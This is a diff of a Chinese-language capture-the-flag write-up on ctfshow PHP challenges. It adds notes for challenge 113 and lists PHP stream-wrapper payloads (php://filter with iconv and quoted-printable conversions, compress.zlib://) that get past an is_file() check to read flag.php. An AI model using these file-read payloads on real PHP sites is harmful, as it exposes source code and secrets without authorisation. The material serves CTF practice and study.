@@ -303,16 +303,16 @@ var_dump($$v1);   `var_dump($ctfshow);`--->`var_dump($GLOBALS);`
 [is_file()](https://www.php.net/manual/zh/function.is-file.php) 函数用于检查文件是否存在。
 如果文件存在且为正常的文件则返回 true，否则返回 false。这里if条件有`！`
 
-php://filter/resource=flag.php
+php://filter/resource=flag.php    
 php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
 php://filter/read=convert.quoted-printable-encode/resource=flag.php
 compress.zlib://flag.php
 
 
+**113**
+![18](TU/image%20copy%204.png)
 
-
-
-
+`compress.zlib://flag.php`
 
 
 
